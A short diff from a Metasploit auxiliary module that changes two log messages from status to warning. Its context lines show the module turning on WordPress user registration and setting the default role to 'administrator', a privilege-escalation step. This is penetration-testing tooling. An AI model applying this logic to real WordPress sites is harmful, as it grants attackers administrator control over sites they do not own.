@@ -75,13 +75,13 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    print_status("Enabling user registrations...")
+    print_warning("Enabling user registrations...")
     if set_wp_option('users_can_register', '1', ajax_security).nil?
       print_error("Failed to enable user registrations")
       return
     end
 
-    print_status("Setting the default user role...")
+    print_warning("Setting the default user role type to administrator...")
     if set_wp_option('default_role', 'administrator', ajax_security).nil?
       print_error("Failed to set the default user role")
       return
